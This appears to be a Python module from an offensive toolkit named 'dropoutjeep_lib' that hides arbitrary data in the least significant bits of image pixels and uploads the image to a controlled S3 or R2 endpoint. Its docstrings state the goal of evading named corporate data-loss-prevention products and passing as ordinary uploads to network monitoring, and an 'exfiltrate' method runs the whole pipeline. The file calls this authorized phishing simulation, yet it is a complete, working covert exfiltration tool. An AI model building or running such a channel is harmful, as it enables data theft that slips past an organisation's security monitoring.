"""LSB image steganography exfiltration channel for authorized phishing simulations.

Embeds data in the least significant bits of JPEG pixel data. Corporate DLP
(Symantec DLP, Forcepoint, Microsoft Purview) scans outbound HTTP content but
cannot detect LSB-steganographed images — they look like normal image uploads.

Uploads to controlled AWS S3 / Cloudflare R2 bucket. Looks like a normal
cloud upload to network monitoring.

Usage:
    from dropoutjeep_lib.utils.stegano import SteganoExfil
    steg = SteganoExfil()
    encoded_image = steg.embed(b'secret data', cover_image_path='cover.jpg')
    steg.upload(encoded_image, 'https://my-bucket.s3.amazonaws.com/upload')
"""

import base64
import hashlib
import io
import logging
import os
import struct
import zlib
from typing import Optional, Tuple

logger = logging.getLogger("dropoutjeep")

# Try to import PIL/Pillow for image manipulation
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    logger.warning("Pillow not available. Install with: pip install Pillow")

# Magic header to identify steganographed images
STEG_MAGIC = b'\x53\x54\x45\x47'  # "STEG"


class SteganoExfil:
    """LSB image steganography exfiltration channel.

    Embeds data in the least significant bits of pixel color channels.
    Uses a magic header + length prefix + CRC32 for integrity.

    Args:
        bits_per_channel: Number of LSBs to use per channel (1-3).
            1 = max stealth, 3 = max capacity. Default 2.
    """

    def __init__(self, bits_per_channel: int = 2):
        if not PIL_AVAILABLE:
            raise RuntimeError("Pillow required. Install with: pip install Pillow")
        if bits_per_channel < 1 or bits_per_channel > 3:
            raise ValueError("bits_per_channel must be 1-3")
        self.bits_per_channel = bits_per_channel
        self.max_val = (1 << bits_per_channel) - 1

    def _calculate_capacity(self, width: int, height: int, channels: int = 3) -> int:
        """Calculate max bytes that can be embedded in an image."""
        total_bits = width * height * channels * self.bits_per_channel
        # Reserve space for magic (4) + length (4) + CRC32 (4) = 12 bytes header
        return (total_bits // 8) - 12

    def embed(self, data: bytes, cover_image_path: str = None,
              cover_image_bytes: bytes = None, output_format: str = 'PNG') -> bytes:
        """Embed data into a cover image using LSB steganography.

        Args:
            data: Raw bytes to embed
            cover_image_path: Path to cover image file
            cover_image_bytes: Cover image as bytes (alternative to path)
            output_format: Output image format ('PNG' or 'BMP').
                PNG is recommended — JPEG is lossy and destroys LSB data.

        Returns:
            Encoded image as bytes.
        """
        if not cover_image_path and not cover_image_bytes:
            # Generate a random noise cover image
            cover_image_bytes = self._generate_cover_image()

        if cover_image_path:
            img = Image.open(cover_image_path)
        else:
            img = Image.open(io.BytesIO(cover_image_bytes))

        # Convert to RGB if needed
        if img.mode != 'RGB':
            img = img.convert('RGB')

        width, height = img.size
        pixels = list(img.getdata())

        capacity = self._calculate_capacity(width, height, 3)
        if len(data) > capacity:
            raise ValueError(
                f"Data too large: {len(data)} bytes > capacity {capacity} bytes. "
                f"Use a larger cover image or increase bits_per_channel."
            )

        # Build payload: magic + length + CRC32 + data
        crc = zlib.crc32(data) & 0xFFFFFFFF
        payload = STEG_MAGIC + struct.pack('!I', len(data)) + struct.pack('!I', crc) + data
        payload_bits = self._bytes_to_bits(payload)

        # Embed bits into LSBs of pixel channels
        bit_idx = 0
        new_pixels = []
        for pixel in pixels:
            r, g, b = pixel
            if bit_idx < len(payload_bits):
                r = self._embed_bits(r, payload_bits, bit_idx)
                bit_idx += self.bits_per_channel
            if bit_idx < len(payload_bits):
                g = self._embed_bits(g, payload_bits, bit_idx)
                bit_idx += self.bits_per_channel
            if bit_idx < len(payload_bits):
                b = self._embed_bits(b, payload_bits, bit_idx)
                bit_idx += self.bits_per_channel
            new_pixels.append((r, g, b))

        img.putdata(new_pixels)

        # Save to bytes
        output = io.BytesIO()
        img.save(output, format=output_format)
        result = output.getvalue()

        logger.info("Stego embed complete: %d bytes embedded in %dx%d image (%d bytes)",
                    len(data), width, height, len(result))
        return result

    def _embed_bits(self, value: int, bits: list, start_idx: int) -> int:
        """Embed bits into the LSBs of a channel value."""
        mask = ~self.max_val & 0xFF
        embedded = value & mask
        for i in range(self.bits_per_channel):
            if start_idx + i < len(bits):
                embedded |= (bits[start_idx + i] << i)
        return embedded

    def _bytes_to_bits(self, data: bytes) -> list:
        """Convert bytes to a list of bits (LSB first)."""
        bits = []
        for byte in data:
            for i in range(8):
                bits.append((byte >> i) & 1)
        return bits

    def _bits_to_bytes(self, bits: list) -> bytes:
        """Convert a list of bits (LSB first) to bytes."""
        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                if i + j < len(bits):
                    byte |= (bits[i + j] << j)
            result.append(byte)
        return bytes(result)

    def extract(self, image_bytes: bytes) -> Optional[bytes]:
        """Extract steganographed data from an image.

        Args:
            image_bytes: Image file as bytes

        Returns:
            Extracted data bytes, or None if no valid stego data found.
        """
        img = Image.open(io.BytesIO(image_bytes))
        if img.mode != 'RGB':
            img = img.convert('RGB')

        width, height = img.size
        pixels = list(img.getdata())

        # Extract all LSBs
        all_bits = []
        for pixel in pixels:
            for channel_val in pixel:
                for i in range(self.bits_per_channel):
                    all_bits.append((channel_val >> i) & 1)

        # Convert to bytes
        all_bytes = self._bits_to_bytes(all_bits)

        # Check magic header
        if len(all_bytes) < 12:
            return None
        if all_bytes[:4] != STEG_MAGIC:
            return None

        # Extract length and CRC
        data_len = struct.unpack('!I', all_bytes[4:8])[0]
        stored_crc = struct.unpack('!I', all_bytes[8:12])[0]

        if data_len == 0 or data_len > len(all_bytes) - 12:
            return None

        # Extract data
        data = all_bytes[12:12 + data_len]

        # Verify CRC
        actual_crc = zlib.crc32(data) & 0xFFFFFFFF
        if actual_crc != stored_crc:
            logger.warning("Stego CRC mismatch: expected %08x, got %08x", stored_crc, actual_crc)
            return None

        logger.info("Stego extract complete: %d bytes recovered", len(data))
        return data

    def _generate_cover_image(self, width: int = 800, height: int = 600) -> bytes:
        """Generate a random noise cover image."""
        import random
        img = Image.new('RGB', (width, height))
        pixels = []
        for _ in range(width * height):
            pixels.append((
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255),
            ))
        img.putdata(pixels)
        output = io.BytesIO()
        img.save(output, format='PNG')
        return output.getvalue()

    def upload(self, image_bytes: bytes, upload_url: str,
               headers: dict = None, field_name: str = 'file',
               filename: str = 'image.png') -> bool:
        """Upload steganographed image to a controlled endpoint.

        Looks like a normal image upload to network monitoring.

        Args:
            image_bytes: Steganographed image bytes
            upload_url: Upload endpoint URL (S3 presigned URL, R2 endpoint, etc.)
            headers: Additional HTTP headers
            field_name: Form field name for the file upload
            filename: Filename for the uploaded file

        Returns:
            True if upload succeeded.
        """
        import requests

        try:
            files = {field_name: (filename, image_bytes, 'image/png')}
            resp = requests.post(
                upload_url,
                files=files,
                headers=headers,
                timeout=30,
            )
            if resp.status_code in (200, 201, 204):
                logger.info("Stego image uploaded to %s (status=%d, size=%d bytes)",
                            upload_url, resp.status_code, len(image_bytes))
                return True
            else:
                logger.warning("Stego upload failed: status=%d, body=%s",
                               resp.status_code, resp.text[:200])
                return False
        except Exception as e:
            logger.error("Stego upload error: %s", e)
            return False

    def exfiltrate(self, data: bytes, upload_url: str,
                   cover_image_path: str = None,
                   headers: dict = None) -> bool:
        """Full pipeline: embed data in image, upload to controlled endpoint.

        Args:
            data: Raw bytes to exfiltrate
            upload_url: Upload endpoint URL
            cover_image_path: Optional cover image path (random noise if not provided)
            headers: Additional HTTP headers

        Returns:
            True if data was embedded and uploaded successfully.
        """
        try:
            image_bytes = self.embed(data, cover_image_path=cover_image_path)
            return self.upload(image_bytes, upload_url, headers=headers)
        except Exception as e:
            logger.error("Stego exfil failed: %s", e)
            return False

    def exfiltrate_string(self, text: str, upload_url: str,
                          cover_image_path: str = None) -> bool:
        """Convenience method to exfiltrate a string."""
        return self.exfiltrate(text.encode('utf-8'), upload_url, cover_image_path)
